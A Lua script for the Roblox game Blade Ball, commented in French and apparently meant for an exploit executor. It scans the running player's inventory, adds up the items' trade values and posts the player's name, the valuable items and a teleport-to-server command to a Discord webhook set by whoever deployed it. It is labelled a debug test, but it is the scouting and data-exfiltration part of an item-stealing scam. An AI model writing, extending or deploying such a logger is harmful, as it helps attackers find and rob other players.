_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // CONFIGURATION (Variables récupérées depuis ton exécution)
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // FONCTION WEBHOOK UNIVERSELLE (Crucial pour le test)
local function universalRequest(options)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        return requestFunc(options)
    else
        warn("L'exécuteur ne supporte pas les requêtes HTTP.")
    end
end

-- // VÉRIFICATION MINIMALE
if webhook == "" then
    warn("ERREUR : Webhook non configuré dans _G.webhook")
    return
end

-- // CHARGEMENT DES DONNÉES DE JEU
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // SCAN DE L'INVENTAIRE
local itemsFound = {}
local totalRAP = 0
local categories = {"Sword", "Emote", "Explosion"}

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for itemId, itemInfo in pairs(clientInventory[cat]) do
            local rap = 0
            pcall(function()
                -- Extraction du RAP
                for serializedKey, value in pairs(rapData[cat]) do
                    if string.find(serializedKey, itemInfo.Name) then
                        rap = value
                        break
                    end
                end
            end)

            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsFound, {Name = itemInfo.Name, RAP = rap})
            end
        end
    end
end

-- // ENVOI DU TEST WEBHOOK
if #itemsFound > 0 or totalRAP > 0 then
    local fields = {
        {name = "Joueur 👤", value = "```" .. plr.Name .. "```", inline = true},
        {name = "Total RAP 💰", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
        {name = "Serveur 📋", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```", inline = false},
        {name = "Inventaire (Top Items) 📝", value = "", inline = false}
    }

    -- Groupage pour l'affichage
    local text = ""
    for i, item in ipairs(itemsFound) do
        if i <= 15 then -- Limite pour éviter de bloquer l'embed Discord
            text = text .. "• " .. item.Name .. " (" .. formatNumber(item.RAP) .. ")\n"
        end
    end
    fields[4].value = text ~= "" and text or "Aucun item au-dessus du RAP min."

    local data = {
        ["username"] = "Blade Ball Inventory Logger",
        ["content"] = (ping == "Yes" and "@everyone" or ""),
        ["embeds"] = {{
            ["title"] = "🧪 TEST LOG - INVENTAIRE DÉTECTÉ",
            ["color"] = 16776960, -- Jaune pour le test
            ["fields"] = fields,
            ["footer"] = {["text"] = "Mode Debug - Pas de Trade"}
        }}
    }

    local response = universalRequest({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })

    if response then
        print("✅ Message envoyé au Webhook avec succès !")
    else
        print("❌ Échec de l'envoi au Webhook.")
    end
else
    print("⚠️ Aucun item trouvé avec le RAP minimum spécifié (" .. min_rap .. ")")
end
